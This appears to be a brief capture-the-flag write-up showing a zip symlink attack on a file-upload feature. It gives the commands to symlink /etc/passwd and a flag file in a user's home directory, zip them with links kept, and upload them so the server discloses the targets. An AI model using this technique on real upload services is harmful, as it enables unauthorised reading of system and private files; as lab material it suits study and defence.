+ Lets create a symlink with the following command:
`ln -s /etc/passwd passwd`
+ The zip the symlinks with the follwoing command:
zip -y passwd.zip passwd
+ upload this zip file and yes it works
+ From the contents of the /etc/passwd, we get the user as `copenhagen`. The flag is in `/home/copenhagen/flag.txt`
+ Symlink to get the flag: `ln -s /home/copenhagen/flag.txt flagg`
+ Zip the symlink: `zip -y flag.zip flagg`
+ When we upload this zip, we get the flag

